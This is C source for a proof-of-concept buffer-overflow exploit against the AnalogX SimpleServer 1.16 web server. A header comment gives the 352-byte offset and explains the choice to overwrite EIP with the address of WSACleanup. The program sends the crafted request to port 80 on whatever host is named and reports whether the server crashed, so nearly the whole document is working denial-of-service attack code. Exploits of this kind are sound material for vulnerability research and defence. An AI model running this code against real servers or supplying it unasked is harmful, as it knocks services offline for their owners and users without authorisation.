/*
AnalogX SimpleServer 1.16 Proof-of-concept
	by Auriemma Luigi (e-mail: bugtest at sitoverde.com)

The minimum number of chars to send to the server is 348 'A's
plus "\r\n\r\n" ( = 352).

This is only a proof-of-concept, and the only thing that it do
is to close all the connections of the program http.exe

For do this I have decided to point the EIP to the WSACleanup
function, so all the connections on the port 80 will be killed
and nobody can connect to it.
If I send only 'A's the only connection that will be killed is
the same where the attack was launched, and until the program
is not closed it will continue to do its work, but if we call
WSACleanup is more useful!

* This source is covered by the GNU GPL
*/

#include <stdio.h>
#include <winsock.h>
#include <string.h>
#include "sock_err.h"

#define BUFFSIZE	360
#define OFFSET	352	//where the EIP is overwritten
#define PORT	80
#define CHZ	'A'
#define EIP	"\xf8\xa7\x41\x00"	//the EIP of WSACleanup()
#define RETURN	"\r\n\r\n"

int main(int argc, char *argv[]) {
	setbuf(stdout, NULL);
	if(argc < 2) {
		printf("\nUsage: %s <host>\n", argv[0]);
		exit(1);
	}

	unsigned char	buff[BUFFSIZE];
	struct	sockaddr_in 	peer;
	struct	hostent *hp;
	int	shandle,
		err;
	WSADATA wsadata;

	WSAStartup(MAKEWORD(2,0), &wsadata);
	if(inet_addr(argv[1]) == INADDR_NONE) {
                hp = gethostbyname(argv[1]);
		if(hp == 0) sock_err(-1);
                else peer.sin_addr = *(struct in_addr *)hp->h_addr;
        }
                else peer.sin_addr.s_addr = inet_addr(argv[1]);
	peer.sin_port   = htons(PORT);
	peer.sin_family = AF_INET;

	memset(buff, CHZ, OFFSET);
	memcpy(buff + OFFSET, EIP, 4);
	memcpy(buff + OFFSET + 4, RETURN, 4);

	shandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sock_err(shandle);
	err = connect(shandle, (struct sockaddr *)&peer, sizeof(peer));
	sock_err(err);
	err = send(shandle, buff, BUFFSIZE, 0);
	sock_err(err);
	err = recv(shandle, buff, BUFFSIZE, 0);
	if(err < 0) printf("\nServer crashed!\n");
		else printf("\nServer is not vulnerable\n");
	closesocket(shandle);
	WSACleanup();
	return(0);
}

